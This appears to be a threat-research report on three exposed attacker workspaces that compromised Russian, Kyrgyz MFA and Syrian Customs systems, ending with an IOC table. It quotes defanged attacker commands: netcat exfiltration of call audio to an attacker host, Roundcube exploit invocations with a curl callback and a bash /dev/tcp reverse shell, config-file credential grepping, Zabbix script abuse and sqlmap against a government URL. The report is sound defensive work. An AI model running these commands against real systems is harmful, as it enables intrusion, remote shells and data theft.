---
title: "Russian and Allied Government Systems Compromised in Targeted Campaigns"
description: "Three exposed operator workspaces reveal confirmed access to Russian and Kyrgyz government systems, a Syrian Customs C2 inventory, stolen data and wider targeting of Russian state and industrial organisations."
content_type: research
canonical_url: https://aabbcvc.github.io/research/government-open-directories/
categories:
  - Threat Research
tags:
  - Russia
  - C2
  - Exploitation
  - DFIR
  - Webshell
  - Credential Theft
  - Exfiltration
  - Vulnerability Research
header:
  teaser: /assets/images/covers/government-open-directories.png
  og_image: https://aabbcvc.github.io/assets/images/covers/government-open-directories.png
toc: true
---

## Overview

Using Hunt.io's AttackCapture, we identified three exposed operator workspaces linked to compromises against Russian, Kyrgyz and Syrian government systems.

The three workspaces document different outcomes:

- **Confirmed application compromise:** A roleless account accessed protected administrative data in the Atlas platform used by Russia's Ministry of Emergency Situations, or MChS, and changed application state.
- **Confirmed SharePoint compromise:** The same workspace contained evidence that a forged site-administrator token and a SharePoint exploit chain reached code execution at Russia's United Engine Corporation, or UEC.
- **Confirmed server execution:** Uploaded PHP ran as `www-data` on a Kyrgyz Ministry of Foreign Affairs, or MFA, web host. VShell-compatible agents later ran from `/tmp`.
- **Reported historical C2 access:** A separate database recorded Syrian Customs hostnames and privileged account contexts.
- **Repeated targeting:** A third workspace repeatedly targeted Kyrgyzstan's national security webmail and Russian systems with public exploits and supplied credentials.

Hunt.io first observed the open directories on these dates:

| Exposed directory | First observed by Hunt.io | Strongest government-related evidence |
|---|---|---|
| `45.151.139[.]249:8765` | 30 August 2026 | MChS Atlas administrative access and state changes; UEC SharePoint code execution; Union Travel data theft |
| `207.148.64[.]94:8083` | 30 August 2026 | Kyrgyz MFA command execution and implants; separate Syrian Customs C2 inventory |
| `89.124.123[.]216:8080` | 16 June 2026 | Repeated exploit attempts against GKNB webmail and Russian targets |

> **Campaign separation:** These are three separate campaigns. Attribution is assessed separately for each campaign. We compare them because each open directory exposed government targeting or compromise.


## Russia: EMERCOM Atlas Compromise and Wider Targeting

[![Hunt.io AttackCapture view of the exposed EMERCOM and Russian-targeting workspace](/assets/images/government-open-directories/emercom-open-directory.png){: .align-center .img-border}](/assets/images/government-open-directories/emercom-open-directory.png)

*Figure 1. Hunt.io AttackCapture view of the exposed `45.151.139[.]249:8765` workspace, showing 1,620 files across 11 subdirectories when captured.*

The first open directory exposed a broad offensive workspace. Ukrainian-language strings appeared throughout the playbook, including scripts, comments and operator-facing text. Ctrl-Alt-Intel is not attributing this to any known group or threat actor.

MChS received focused attention:

- 18 ministry-related domains were shortlisted.
- 18 public IP addresses were selected.
- Targets included mapping, authentication, dispatch, file-sharing and administrative services.
- The strongest result came from Atlas, an emergency-management mapping platform.

### What EMERCOM is

EMERCOM is Russia's federal emergency ministry. Its full translated name is the Ministry of Civil Defence, Emergencies and Disaster Relief of the Russian Federation. Its remit covers civil defence, disaster relief and the coordination of responses to major emergencies.

One EMERCOM subdepartment is the Information and Analytical Center of EMERCOM of Russia, commonly shortened to IAC EMERCOM. It is reportedly responsible for the ministry's internal IT and information security.

IAC EMERCOM also appeared in our earlier research, [Burnt by Burgers: Highlighting Void Blizzard's Russian State Links](https://ctrlaltintel.com/research/VoidBlizzard/). That investigation found:

- Identifiers attributed to suspected Void Blizzard member Denis Obrezko were connected to an IAC EMERCOM work number and repeated activity at EMERCOM facilities during 2021.
- US filings allege that Obrezko previously worked for the FSB and later became deputy director of Yutek-NN.
- The same filings link Yutek-NN to Void Blizzard, a Russian state-aligned cyberespionage group.
- We identified three publicly declared career transitions between Yutek-NN and IAC EMERCOM personnel.

These relationships make IAC EMERCOM a relevant suspected link to state-sponsored espionage. The finding concerns personnel and organisational links between IAC EMERCOM and Yutek-NN.

### A roleless Atlas account reached administrative data

Atlas is an internally developed official EMERCOM hazard and emergency-risk GIS with both public and restricted components.

[![EMERCOM Atlas of Hazards and Risks interface](/assets/images/government-open-directories/atlas-hazards-and-risks.png){: .align-center .img-border}](/assets/images/government-open-directories/atlas-hazards-and-risks.png)

> **From EMERCOM press center**: This year, the "Atlas of Hazards and Risks" information system successfully completed a pilot operation. It currently contains data on various natural and man-made hazards and threats currently affecting Russia's regions. These include, for example, wildfires, floods, power outages in populated areas, transportation disruptions, epidemics, and more. The information will be expanded and updated in the future. The service is already publicly available online.

The retained profile identified a "Test Operator" account whose assigned-role and additional-permission arrays were empty:

```json
{
  "isAdmin": false,
  "isSuperUser": false,
  "roles": [],
  "additionalPermissions": []
}
```

Despite that state, 15 of 29 administrative probes returned data. The operator could read roles, permissions, forms, categories, import definitions, metrics, regions, map-service settings and external connections.

The route behaviour showed inconsistent authorisation:

- Direct role and permission routes returned `403`.
- Parallel `/search` routes returned the protected records.
- Some requests added `X-Closed-Network: true`, apparently to claim an internal-network context.

### Samples of the stolen ATLAS data

The Atlas theft exposed operational structure, configuration and credentials.

The `atlas_mchs_dump.tar.gz` archive contains 15 JSON exports totalling 3.32 MB uncompressed.

| Archived export | Complete retained contents |
|---|---|
| `categories.json` | 459 category records under 15 roots |
| `object_forms.json` | 1,059 form schemas containing 6,667 fields |
| `kafka_imports.json` | Nine import definitions, including field mappings, integration settings and counters |
| `roles.json` and `permissions.json` | 20 roles and 100 permission definitions |
| `my_profile.json` | The roleless, non-administrator `Test Operator` profile used for the requests |
| `regions.json` | Eight federal-district records |
| `metrics.json` and `field_types.json` | 45 environmental metrics and five supported field types |
| `wms.json` | Six map-service configurations, four marked as published |
| `settings_geo.json` and `settings_routes.json` | Eight geo-analysis layer references and three route-planning layer references |
| `external_connections.json` | The legitimate Greenplum connection and the operator-created `SSRF Test` entry |
| `notifications.json` and `orthophotomaps.json` | Both responses returned empty arrays |

The complete category hierarchy contained 459 nodes across 15 roots. Of these, 397 were marked `authorizedOnly: true`.

| Stolen Atlas category | Retained nodes | What it describes |
|---|---:|---|
| Situation monitoring | 210 | Layers used to track emergency conditions, hazards and response activity |
| Territorial bodies of MChS Russia | 188 | How ministry responsibilities and map content are divided across regional bodies |
| External sources | 18 | Data supplied by systems outside Atlas |
| Orthophotomaps | 13 | Aerial or satellite-derived map layers |
| MChS data | 9 | Ministry-owned information sources and operational layers |
| Monitoring | 7 | Environmental or infrastructure monitoring categories |

The retained form schemas show the types of information Atlas was designed to hold:

- **Dispatch services:** communications equipment, radio, satellite and Internet channels, address and region.
- **Temporary accommodation points:** institution name, address, phone number and capacity.
- **Education facilities:** occupancy, fire resistance, alarms, resources and daytime or night-time population.
- **Wildfire-exposed settlements:** municipality and settlement names.
- **Hazardous road sections:** road name, kilometre marker, length, capacity and description.
- **Airports:** municipality, location, characteristics, weather and major incidents.
- **Civil-defence authorities:** authority name, address, public phone number and email address.

The archive contains 1,059 form definitions with 6,667 fields. These schemas reveal the breadth and structure of information Atlas was designed to collect.

The form catalogue included:

- 73 forms associated with fires or fire-response infrastructure.
- 61 forms whose names described hazardous locations or conditions.
- Radiation monitoring and radiation-hazard facilities.
- Hospitals, medical organisations and vaccination sites.
- Airports, aerodromes and helicopter landing sites.
- Oil and gas pipelines, terminals, storage and pumping facilities.
- Hydrotechnical structures, bridges and flood-prone infrastructure.
- Electricity, heating and water-supply infrastructure.
- Population evacuation and temporary accommodation.

The operator also obtained all nine returned Kafka import definitions:

| Data feed | Topic or schema name | State | Counter |
|---|---|---|---:|
| Road accidents | `gibdd_dtp` | work | 943,348 |
| Ministry of Health incidents | `vsodchs` | work | 13,049 |
| MChS emergencies | `wiki_chs_data` | work | 14,306 |
| Water incidents | `gims_drown_request` | work | 9,189 |
| Fire danger classes | `rosgidromet_kpo_forecast_inline` | stop | 1,234,168 |
| Fire-danger forecast | `rosgidromet_ppo_forecast_inline` | stop | 824,746 |
| Groundwater monitoring | `geomonitoring_groundwater` | stop | 386,234 |
| Thermal hotspots | `kaskad_thermopoints` | stop | 178,972 |
| Utilities accidents | `gkh_accidents` | stop | 153,763 |

Together, those application counters total 3,757,775 and describe processing volume across the nine integrations.

Other stolen administrative data included:

- All 20 returned roles, including regional operators, a moderator and a super-user role.
- 100 permission definitions for users, roles, tokens, Kafka imports, WMS, external databases and layer import or export.
- All 45 returned environmental metric definitions.
- Eight federal-district records, each parented to Russia.
- Six legitimate WMS layer configurations and one temporary test layer.
- 46 PNG attachments totalling 41.3 MB, mostly regional emblems and hazard or map icons.

The files gave the operator a working blueprint of Atlas: its protected data catalogue, administrative model, regional organisation, integrations and map-service plumbing.

### The operator changed Atlas state

At 19:19:41 +03 on 27 August 2026, a new external connection named `SSRF Test` appeared. An existing Greenplum connection was updated 51 seconds later and displayed as `Greenplum_revealed`.

A second snapshot sequence showed:

- Six legitimate WMS layers.
- Seven layers after a published `Test WMS` entry appeared.
- Six layers again after the test entry disappeared.

The test layer pointed to an out-of-band callback service. A response collected through the Atlas tile proxy confirmed that the server fetched the operator-controlled URL.

The activity comprised unauthorised administrative reads, configuration changes and a demonstrated server-side request.

### Wider Russian targeting from the same workspace

The Atlas evidence sat inside a much broader Russian target set. We count a domain as targeted when it appeared in target-specific tooling or a follow-up exploit pool. We excluded large passive discovery lists and certificate-transparency results from the attack count.

The clearest additional organisations were:

| Organisation | What it does | What the operator attempted | Supported outcome |
|---|---|---|---|
| [Uralchem](https://www.uralchem.com/about/index.php) | A major Russian producer and exporter of nitrogen, potash and complex fertilisers | Password spraying and SharePoint probing at `surveys.uralchem.com`; Moodle abuse at `education.uralchem.com`; Remote Desktop gateway enumeration at `ts.uralchem.com`, `vpnazot.uralchem.com` and `tsgpmu.uralchem.com`; TrueConf and application probing at `conf.uralchem.com` and `cls-exp-e.uralchem.com`; email tests through `kmx.uralchem.com` | Extensive targeting across collaboration, remote-access, conferencing and mail services |
| [Bui Chemical Plant](https://bhz.ru/) at `bhz.ru` | A Russian producer of fertilisers, micronutrients and chemical products for agriculture and industry | Mail.ru corporate-login spraying, Bitrix administrator guessing, SSRF tests, PHP upload and webshell attempts, exposed-file searches and spoofed email | Targeting across identity, web application and mail services; the SSRF request returned a URL rejection response |
| [Directorate of the State Customer for Maritime Transport Development Programs](https://dgz.ru/index.html) at `dgz.ru` | A Russian federal institution that commissions state maritime-transport development programmes | Its Exchange host was tested for ProxyShell, ProxyLogon and ProxyNotShell vulnerabilities, including CVE-2021-34473, CVE-2021-34523, CVE-2021-31207, CVE-2021-26855 and CVE-2022-41040 | Exchange exploitation attempts and reconnaissance against adjacent hosts |
| [United Engine Corporation](https://uecrus.com/) at `uecrus.com` | A Rostec company that develops and manufactures engines for aviation, space, naval and energy applications | The operator forged SharePoint site-administrator tokens for `engineers2030.uecrus.com` using CVE-2023-29357, then used CVE-2023-24955-style Business Data Connectivity payloads to run C# and attempt webshell, file-read and database actions | Authentication bypass and C# execution produced an output file. A later SQL membership-hash dump failed because the `sqlcmd` invocation was malformed |
| [Russian Institute for Strategic Studies](https://www.riss.ru/en/ob-institute/tseli-i-zadachi/) at `riss.ru` | A state political and security think tank founded by the Russian president to support national-security policy | Network and subdomain reconnaissance, Rocket.Chat password spraying, Bitrix CVE-2022-27228 file-write attempts, SSRF and open-redirect tests, WAF bypasses and scanning of nearby infrastructure | Persistent targeting through exploit and authentication attempts |

The UEC artefacts went further than a scanner. The operator generated unsigned SharePoint tokens, queried administrative APIs, overwrote a Business Data Connectivity model with injected C#, triggered it through `ProcessQuery`, restored the original model and read results from `SiteAssets`. The injected process attempted to launch `sqlcmd` and terminated with an error before producing membership hashes.

The attempted post-exploitation command targeted SharePoint's forms-based authentication database. Sensitive query details are shortened here. The objective and result are clear:

```text
sqlcmd.exe -S [database host] -d aspnetdb -E -Q
  "SELECT UserName, Password, PasswordFormat, PasswordSalt, Email, LastLoginDate ..."

exit=1
cmdout=Windows command-resolution error for "C:\Program"
no_outfile
```

Other named targets included:

- `pmu.ru`, `kchk.ru`, `uralagro.ru` and `td.uralchem.ru`, all selected in the same fertiliser-sector workstream, were scanned for web, SSH, database and mail services. `pmu.ru` received a focused MySQL 5.7.21 password and anonymous-login attack. The files label `bhz.kosnet.ru` and `bhz.com` as possible Bui Chemical Plant infrastructure and record targeting against both.
- `gbi-24.ru`, a Russian supplier of reinforced-concrete products, was tested for FTP, SSH and mail exposure, SMTP user enumeration, relay behaviour and default IMAP credentials.
- `eidosfilm.ru`, a Russian film and media-production site, received WordPress backup and installation checks, XML-RPC password guessing, pingback SSRF probes and mail-relay tests.
- `stends.ra-riss.ru`, an RISS-associated hostname, received WordPress oEmbed, redirection, DNS-rebinding, Grafana and Portainer SSRF probes.
- `zr.ru`, the Russian automotive publication Za Rulem, appeared in a Bitrix administrator password attack against associated infrastructure.
- `aiggroup.ru`, `exelab.ru` and `i.nsk.ru` were selected as WordPress exploit candidates. The retained result marks every attempted shell deployment as unsuccessful.
- `i.realty.ru` and `www.meta-invest.ru` were tested with Adminer file-write payloads. The recorded shell URL returned `404`.
- `200hramov.mos.ru`, `a.rgis.rk.gov.ru`, `ag.rgis.rk.gov.ru` and `gasu.gov.ru` were sent GeoServer data-store injection and operating-system command payloads. The retained results recorded zero shells and zero successful callback canaries.

The workspace also held two APISIX route exports containing 1,151 entries. Many routes embedded Lua functions for arbitrary command execution, internal-port discovery, metadata-service access and SSH-key persistence. We report these as unattributed route artefacts and omit them from the named victim count.

#### Mass Bitrix follow-up

A separate automated lane moved 76 valid Russian domains into Bitrix follow-up or exploitation lists. The tooling attempted CVE-2022-27228 agent injection and PHP shell creation. The terms `confirmed` and `vuln` in the filenames describe product detection or operator triage. A retained 100-host test logged zero shells.

<details markdown="1">
<summary>Show the 76 Bitrix follow-up domains</summary>

- `ac.mos.ru`, `address.novgorod.ru`, `adm-bruhoveckaya.ru`, `admin-tih.ru`, `admin.economy.gov.ru`, `admkrai.krasnodar.ru`, `admnvrsk.ru`, `admsurgut.ru`, `admtobolsk.ru`, `aisarhiv.sev.gov.ru`
- `aiso.mos.ru`, `antifrogen.msk.ru`, `antifrogen.spb.ru`, `ar.gov.ru`, `atmr.ru`, `audit-it.ru`, `autoprogress.msk.ru`, `b24.mtp.mos.ru`, `belebey-mr.ru`, `check.mbm.mos.ru`
- `chelsosna.ru`, `cos.mos.ru`, `dc5.mos.ru`, `dommebeli.spb.ru`, `domod.ru`, `economy.gov.ru`, `edu.sochi.ru`, `ekb.ru`, `erp.roek.ryazan.ru`, `fgistp.economy.gov.ru`
- `foto.mos.ru`, `ghosler.irkutsk.ru`, `gisp.gov.ru`, `gorgaz.ryazan.ru`, `gorodufa.ru`, `gup-krymenergo.crimea.ru`, `gzhi.kursk.ru`, `ivrayon.ru`, `kamyshlovsky-region.ru`, `klgd.ru`
- `kpss.kaliningrad.ru`, `krasnoe.kostroma.gov.ru`, `krd.ru`, `krymsk-region.ru`, `ksp36.ru`, `kulturanoyabrsk.yanao.ru`, `kurgan-city.ru`, `mail.saratov.gov.ru`, `medic.tula.ru`, `mk.tula.ru`
- `mkmcn.mos.ru`, `mosvelofest.mos.ru`, `october.tomsk.gov.ru`, `optimist.perm.ru`, `orel-adm.ru`, `orlmo.ru`, `ossig.mos.ru`, `pf.crimea.ru`, `programs.gov.ru`, `rmat.pskov.ru`
- `saratov.gov.ru`, `saratovmer.ru`, `sevastopol.gov.ru`, `slavyansk.ru`, `sochi.ru`, `staradm.ru`, `termoform.perm.ru`, `test-task.tatarstan.ru`, `tm.sd.perm.ru`, `tuapseregion.ru`
- `uizo.voronezh-city.ru`, `unica-test.mos.ru`, `uobr.ru`, `www.china.tomsk.ru`, `www.zelenograd.ru`, `yantarny.gov39.ru`

</details>


### Union Travel: from default credentials to a private network

The same workspace contained stronger operating-system and data-theft evidence at Russian travel company Union Travel.

A Zabbix instance at `85.95.166[.]40:8080` accepted its documented default administrator credentials. The operator abused Zabbix's script functions:

```python
api("script.update", {"scriptid": sid, "command": cmd}, token)
api("script.execute", {"scriptid": sid, "hostid": hostid}, token)
```

The retained automation shows hands-on post-exploitation commands. These examples are shortened and defanged:

```bash
for p in 22 80 443 445 3389 3306 8080 5432; do
  (echo >/dev/tcp/192.168.115.20/$p) 2>/dev/null && echo "OPEN:$p"
done

find / -name 'zabbix.conf.php' 2>/dev/null | head -3
cat /var/www/html/zabbix/conf/zabbix.conf.php 2>/dev/null | grep -E 'DB_|USER|HOST'
```

Transfer and tunnel logs recorded the next steps:

- `chisel` was downloaded at 21:45:37 on 29 August 2026.
- A reverse SOCKS tunnel was listening three seconds later.
- `fscan` was downloaded at 21:47:11.
- The operator scanned `192.168.115.0/24`.
- The scan recorded 914 checks and 95 open ports.

Internal results identified `office.union-travel.ru`, named workstations, cameras, printers, SIP devices, databases, file-transfer services and Windows systems.

The operator then collected call audio. A retained command shows the transfer pattern:

```bash
curl -sk 'hxxps://192.168.115.25/<date>/<recording>.mp3' |
  base64 | nc -w 5 45.151.139[.]249 9191
```

The open directory held four SQL dumps totalling 133.6 MB:

- `cdr.sql`: 297,941 rows of call time, caller and callee identifiers, routing, duration, disposition, remote IP and recording filename.
- `clients.sql`: 6,784 rows containing client names, countries, phone numbers and legal-entity links.
- `tickets.sql`: 34,975 rows containing tickets, routes, payment context, prices, commissions, offices, managers and comments.
- `tourists.sql`: 66,954 rows containing names, dates of birth, sex, email addresses, phone numbers, employers, tax identifiers and addresses.

The `user` table also contained password and authentication-key fields, which we redacted.

Seven MP3 files represented six unique recordings. This confirms customer and employee data theft, call metadata collection and audio exfiltration.

### Tooling and success

This workspace favoured simple, repeatable tools:

- `chisel` for reverse tunnels and SOCKS access.
- `fscan`, Masscan and Nmap for discovery.
- Zabbix scripts and Jenkins jobs for command execution.
- Redis cron and Patroni configuration changes for further access attempts.
- Short Python, shell and JavaScript programs tailored to individual services.

The collection shows discovery, weak credentials or exposed administration, command execution, tunnelling, internal discovery and data collection. Malware activity centred on tunnelling and remote-access tools.

## 2. Kyrgyz MFA Compromise and a Syrian Customs C2 Inventory

[![Hunt.io AttackCapture view of the open directory linked to the Kyrgyz MFA compromise](/assets/images/government-open-directories/kyrgyz-mfa-open-directory.png){: .align-center .img-border}](/assets/images/government-open-directories/kyrgyz-mfa-open-directory.png)

*Figure 2. Hunt.io AttackCapture view of the exposed `207.148.64[.]94:8083` workspace, showing 124 retained files associated with the Kyrgyz MFA investigation.*

The second directory contained the clearest government server compromise.

The first successful proof was timestamped 28 August 2026 at 16:29:16 UTC. It used an existing authenticated MFA backend session to upload a one-pixel GIF containing PHP through an embassy-image field.

The application gave the file a random name under `/uploads/embassies/`. Requesting the resulting `.php` path returned:

```text
[GIF prefix omitted]
uid=33(www-data) gid=33(www-data) groups=33(www-data)
__ID_EXIT_CODE__=0
```

This confirms command execution as the web-service account on a host named `mfa`, with private address `10.51.6.93`.

This was an authenticated executable file upload weakness consistent with CWE-434. The retained workflow begins with an authenticated backend session.

### What happened after execution

The records show methodical post-exploitation from the web context.

The proof metadata preserves `id` verbatim. Returned output from the longer one-shot payloads records the following actions:

- Enumerated the default route and local `10.51.6.64/27` network.
- Checked for `curl`, `wget` and `nc`.
- Read `.env`, `.env.local`, `.env.test`, `services.yaml` and Git metadata.
- Read Yii and Symfony configuration.
- Recovered database, application, API, cookie-signing and JWT-related secrets.
- Queried local PostgreSQL as user `utn`.
- Listed public tables, database roles and `plpgsql`.
- Enumerated SUID files, sudo behaviour, services, cron directories, timers and root-owned processes.
- Inspected Bitdefender and Puppet components.
- Tested SSH, Redis, PostgreSQL and MySQL credentials against internal systems.
- Probed internal web applications and framework debug paths.

A local PostgreSQL session returned `current_user=utn`, `current_database=utn` and PostgreSQL 15.3. Visible tables included:

- `person_info`
- `organization`
- `document`
- `accident_record`
- `labour_dispute_record`
- Building, facility, device, ship, resolution and inspection tables

This proves database access and schema visibility.

The operator also listed a pre-existing `mfafront1.zip` archive of about 16 GB.

### VShell agents and a web-based relay

The operator's first reverse-stage attempts failed with connectivity errors. The workflow changed to full Linux agents listening locally on the MFA host.

Two VShell-compatible payloads were confirmed by victim-side hashes, processes and sockets:

```text
/tmp/.mfa-vshell-forward-8085
/tmp/.mfa-vshell-forward-8086
```

Traffic moved through a custom relay:

```text
C2 service and SOCKS frontend
  -> local TCP-to-HTTPS adapter
  -> token-protected PHP endpoint on the MFA website
  -> Unix socket and Python bridge
  -> VShell-compatible agent on 127.0.0.1:8086
```

The victim-side components included:

- Four PHP relay endpoints under `/uploads/embassies/`.
- `/tmp/.mfa_target_forward_bridge.py`.
- `/tmp/.mfa_forward_bridge_8086.sock`.
- Local and public SOCKS or adapter ports.
- Repeated reconnect and recovery attempts.

This adaptive workaround provided continuing access through the already reachable web application after direct C2 failed.

A separate 9,800-byte C loader was also staged. Static analysis showed it could:

- Connect to `207.148.64[.]94:8084`.
- Receive an XOR-encoded stage using key `0x99`.
- Create a memory-backed file with `memfd_create`.
- Execute the stage with `fexecve`.
- Masquerade as `[kworker/0:2]`.

Static analysis identified those capabilities in the file.



### Lateral movement attempts and observed results

The operator probed all 30 usable addresses in the local `/27`. Targets included storage, notification, document editing, licensing, vehicle inspection and construction services.

The supplied outcomes show clear limits:

- SSH verification: 198 attempts, zero successes.
- PostgreSQL reuse: 40 attempts, zero successes.
- Redis tests: authentication required or wrong password.
- MySQL tests: authentication denied.
- `sudo`: password required.
- SUID and Bitdefender checks: enumeration completed with privilege status unchanged.
- Laravel Ignition handler: debug behaviour reached during command-execution targeting.
- Unsigned JWT test: response changed from `403` to `500` and returned an application error.

The Kyrgyz MFA web host was compromised.

### What the Syrian Customs records show

A separate historical C2 database in the same directory contained 98 registrations representing 31 distinct hostname and IP pairs.

Five hostnames explicitly used `customs.gov.sy`:

- `asyapp1`
- `asyw-db1`
- `asyw-db2`
- `backup-01`
- `oemcc`

Nearby records described virtualisation, storage, monitoring, collaboration, ERP and Windows systems. Reported account contexts included `root`, `oracle`, `vsphere-ui` and `NT AUTHORITY\SYSTEM`.

If authentic, the records are consistent with broad privileged access in a Syrian Customs environment. The limitations are substantial:

- The database contains self-reported agent identities.
- It lacks the original exploitation chain.
- It lacks host-specific terminal history.
- Repeated registrations inflate the row count.
- Two Windows identities account for 60 of 98 records.
- A probable test or analysis host named `PETER-PC` appears in the inventory.
- The surrounding collection contains `ctf`, test and replay markers.

The records support a historical C2 inventory of 98 agent rows associated with Syrian Customs.

## 3. Kyrgyz National Security and Russian Targets

[![Hunt.io AttackCapture view of the workspace targeting Kyrgyz national security and Russian systems](/assets/images/government-open-directories/gknb-open-directory.png){: .align-center .img-border}](/assets/images/government-open-directories/gknb-open-directory.png)

*Figure 3. Hunt.io AttackCapture view of the exposed `89.124.123[.]216:8080` workspace, showing 53 files and 11 subdirectories containing exploit material and shell history.*

Hunt.io first observed the third open directory at `89.124.123[.]216:8080` on 16 June 2026.

Its 146-line `.bash_history` captured a hands-on operator:

- Cloning public exploit repositories.
- Installing PHP and Python dependencies.
- Editing exploit scripts.
- Building a malicious upgrade archive.
- Starting netcat listeners.
- Retrying callbacks with different syntax.
- Moving between unrelated products and targets.

The most persistent government target was `mail.gknb.gov[.]kg`, associated with Kyrgyzstan's State Committee for National Security, or GKNB.

This workspace documents targeting and attempted exploitation through target inputs, operator commands and exploit tooling.

### Roundcube CVE-2025-49113 attempts

The operator used two public proof-of-concept implementations for CVE-2025-49113, a post-authentication Roundcube remote-code-execution vulnerability involving PHP object deserialisation.

Credentials were supplied on the command line. We removed them from these examples:

```bash
php CVE-2025-49113.php hxxps://mail.gknb.gov[.]kg/mail \
  <ACCOUNT> <PASSWORD> "whoami"

php CVE-2025-49113.php hxxps://mail.gknb.gov[.]kg/mail \
  <ACCOUNT> <PASSWORD> \
  "curl hxxp://89.124.123[.]216:8080/$(id | base64 -w0)"

php CVE-2025-49113.php hxxps://mail.gknb.gov[.]kg/mail \
  <ACCOUNT> <PASSWORD> \
  "bash -i >& /dev/tcp/89.124.123[.]216/443 0>&1"
```

These are exact command patterns from the shell history with credentials removed and network indicators defanged.

The operator tried:

- `whoami` and `id` to confirm execution.
- Netcat callbacks on ports 443, 8080 and 8081.
- Bash `/dev/tcp` reverse shells.
- Base64-wrapped commands.
- HTTP callbacks carrying encoded command output.

Three Russian-language or Russian-linked mail hosts also appeared. One attempt requested `cat /etc/shadow`; others requested `whoami` or a reverse shell.

The directory records credential-supplied commands against the target webmail systems.



### Other exploit tracks

The operator moved quickly between public vulnerabilities and exposed services:

| Vulnerability or mechanism | Observed activity | Supported outcome |
|---|---|---|
| Roundcube CVE-2025-49113 | Credential-supplied commands against four mail hosts | Repeated exploit targeting |
| PAN-OS CVE-2024-3400 | Checker invocation and payload-generation tooling | The recorded checker likely failed locally due to its arguments |
| PHP-CGI CVE-2024-4577 | RCE-capable scripts run against three URL variants | Exploit targeting across three paths |
| ShareFile CVE-2026-2699 | Detection script run against six unique IPs | Detection targeting across six IPs |
| Ivanti Sentry tooling labelled CVE-2026-10520 | 598 endpoints across 542 hosts in target lists | Large-scale target collection |
| Kerio Control | Reverse-shell firmware image and CSRF upgrade tooling | Payload preparation and delivery targeting |
| FreePBX API execution | Hardcoded target and reverse-shell command | Script execution and callback targeting |
| SQL injection | `sqlmap` run against a Russian federal-agency URL | SQL injection targeting |

The history also recorded this exact SQL injection command:

```bash
sqlmap -u "hxxps://fas.gov[.]ru/indikativnyj-tarif-na-transportirovku-nefti/indikat?eval_id=1"
```

A stock p0wny PHP webshell named `shell.php` was staged locally. It supports command execution, file upload and download, directory navigation and several PHP execution functions. Its observed lifecycle ends on the staging server.

A 154-byte `upgrade.img` contained a one-line netcat reverse shell prepared for Kerio's custom-upgrade process.

This workspace shows opportunistic tradecraft and repeated manual experimentation. Mistyped commands, invalid option combinations and payload changes suggest an interactive, troubleshooting-heavy workflow with limited automation.

## Comparative Analysis

These are three separate campaigns. Campaign attribution is assessed independently. We compare them because their exposed workspaces show different routes into government systems, different levels of operator access and different outcomes.

| Dimension | EMERCOM, UEC and Russian commercial targets | Kyrgyz MFA and Syrian Customs | GKNB and Russian targets |
|---|---|---|---|
| Targeting | Focused EMERCOM and UEC activity alongside state, industrial and commercial follow-up | Government foothold followed by internal exploration; separate historical C2 cluster | Repeated webmail targeting inside a multi-product exploit workspace |
| Initial access | Broken Atlas authorisation; forged SharePoint token and injected C# at UEC; default Zabbix credentials | Authenticated executable image upload | Public CVEs with supplied credentials |
| Post-exploitation | Configuration theft, SharePoint API enumeration and code execution, Zabbix commands, Chisel, fscan, SQL and audio collection | Webshell execution, secret discovery, local database access, VShell agents and a web relay | Callback listeners and payload iteration during targeting |
| Strongest success | Atlas data access and state changes; UEC SharePoint code execution; deep commercial compromise | Confirmed MFA execution and implants | Exploit and credential targeting |
| Government data | Full Atlas taxonomies and form schemas, privileges, integrations and two tokens; UEC SharePoint execution | MFA application secrets and database schema; Syrian C2 identities | Government-system targeting |
| Customisation | Short service-specific automation | Custom PHP and Python transport around VShell | Mostly public proof-of-concepts and stock shell tools |
| Wider movement | Successful private-network pivot at Union Travel | Extensive discovery; lateral login attempts failed | External-service targeting and callback preparation |

### Tradecraft

The first workspace was efficient and repeatable. The operator converted exposed administration and default credentials into tunnels, internal discovery and collection.

The MFA records show more adaptive engineering:

- A one-shot PHP upload established execution.
- Direct staging failed.
- Full agents were placed on disk.
- C2 was carried through PHP, HTTPS, a Unix socket and Python.
- The operator repeatedly repaired the relay.

The third workspace was more manual and error-prone. Its shell history shows public tooling, syntax changes and repeated listeners. The evidentiary trail ends with operator-side activity.

### Opportunism and targeting

Focused government targeting and opportunistic scanning coexisted:

- MChS was deliberately shortlisted inside a corpus of millions of IPs.
- UEC received a tailored SharePoint chain. Uralchem, Bui Chemical Plant, DGZ and RISS received service-specific targeting.
- Another 76 Russian domains entered automated Bitrix follow-up lists. The retained 100-host test produced zero shells.
- GKNB webmail was retried many times inside a workspace covering unrelated products.
- Union Travel was a commercial target where weak management credentials led to deeper access than most government probes.
- The Syrian Customs cluster may represent earlier access, a reused C2 database or a mixed analysis environment.

Victim counts require evidence beyond target-list inclusion. Success came where ordinary controls failed: inconsistent authorisation, executable uploads, default credentials and reachable management functions.

### Success and impact

The campaign outcomes form this hierarchy:

1. **Union Travel:** confirmed host execution, private-network pivot and theft of structured personal data and call audio.
2. **Kyrgyz MFA:** confirmed web execution, application-secret collection, local database access and two running VShell-compatible agents.
3. **UEC SharePoint:** confirmed authentication bypass and injected C# execution. The database hash-dump attempt terminated with an error.
4. **MChS Atlas:** confirmed protected-data access and application-state modification.
5. **Syrian Customs:** privileged C2 registrations with limited corroboration.
6. **GKNB and other Russian targets:** repeated exploit, credential and reconnaissance targeting.

The exposure of the workspaces caused further harm. Stolen data, credentials, target lists and tools became available from the same servers. Access logs from the first workspace show additional third-party downloads from the staging host, extending the breach beyond the original collector.

## IOCs

The table contains operator infrastructure and malware or host artefacts supported by the exposed workspaces. Victim-owned public systems are excluded.

| Indicator | Type | Context |
|---|---|---|
| `45.151.139[.]249:8765` | IP:port | Unauthenticated staging and data server for the EMERCOM, UEC and wider Russian targeting campaign; first observed by Hunt.io on 30 August 2026. |
| `45.151.139[.]249:8888` | IP:port | Redis cron callback listener configured in the same operator workspace. |
| `207.148.64[.]94:8083` | IP:port | Exposed staging service containing the Kyrgyz MFA records and historical C2 database; first observed by Hunt.io on 30 August 2026. |
| `207.148.64[.]94:8084` | IP:port | Staging and C2 endpoint embedded in the analysed Linux stage loader. |
| `89.124.123[.]216:8080` | IP:port | Exposed operator workspace and recurring callback destination; first observed by Hunt.io on 16 June 2026. |
| `89.124.123[.]216:8081` | IP:port | Alternate reverse-shell listener and callback port used by payloads in the same workspace. |
| `f6ee6c03cead9ef26ad5e93f11437323c5e0acef0934468880ac740531234eaa` | SHA256 | VShell-compatible Linux payload variant present in the exposed MFA collection. |
